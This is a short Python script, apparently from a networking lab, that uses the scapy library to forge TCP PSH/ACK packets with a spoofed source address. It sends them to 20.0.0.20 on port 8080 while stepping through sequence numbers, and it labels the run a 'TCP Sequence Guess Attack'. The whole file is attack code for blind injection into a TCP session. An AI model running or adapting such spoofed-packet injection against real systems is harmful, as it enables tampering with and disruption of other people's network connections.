from scapy.all import IP, TCP, send
import time

TARGET = "20.0.0.20"

print("=" * 45)
print("TCP Sequence Guess Attack Started")
print("=" * 45)

STEP = 100000000

for seq in range(0, 2**32, STEP):

    print(f"[+] Guessing SEQ : {seq}")

    pkt = (
        IP(src="30.0.0.30", dst=TARGET)
        /
        TCP(
            sport=50210,
            dport=8080,
            flags="PA",
            seq=seq,
            ack=1
        )
    )

    send(pkt, verbose=False)

    time.sleep(0.5)

print("=" * 40)
print("Attack Finished")
print("=" * 40)